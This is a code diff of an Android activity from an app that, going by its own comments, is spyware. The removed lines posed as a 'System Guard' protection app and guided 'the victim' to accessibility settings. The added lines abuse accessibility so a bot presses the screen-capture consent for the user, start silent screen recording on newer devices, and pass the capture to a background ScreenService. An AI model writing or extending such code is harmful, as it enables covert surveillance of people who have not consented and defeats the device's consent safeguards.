@@ -1,40 +1,46 @@
 package com.tom5.monitor;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
-import android.graphics.Color;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
-import android.view.Gravity;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setGravity(Gravity.CENTER);
-        layout.setBackgroundColor(Color.WHITE);
-
-        TextView tv = new TextView(this);
-        tv.setText("System Guard v3.0");
-        tv.setPadding(0, 0, 0, 50);
-        layout.addView(tv);
-
-        Button btn = new Button(this);
-        btn.setText("تفعيل نظام الحماية");
-        btn.setOnClickListener(v -> {
-            // توجيه الضحية لتفعيل الخدمة
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        });
         
-        layout.addView(btn);
-        setContentView(layout);
+        // 1. فتح إمكانية الوصول
+        if (!isAccessibilityEnabled()) {
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+        }
+
+        // 2. للأجهزة القديمة (تحت 11) نحتاج نطلب البث مرة وحدة والبوت يكبسه
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            startActivityForResult(mpm.createScreenCaptureIntent(), 100);
+        } else {
+            // للأجهزة الحديثة، الخدمة ستصور صامت فور تفعيل الـ Accessibility
+            finish();
+        }
+    }
+
+    private boolean isAccessibilityEnabled() {
+        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        return pref != null && pref.contains(getPackageName());
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        if (requestCode == 100 && resultCode == RESULT_OK) {
+            Intent i = new Intent(this, ScreenService.class);
+            i.putExtra("resCode", resultCode);
+            i.putExtra("resData", data);
+            startForegroundService(i);
+            finish();
+        }
     }
 }
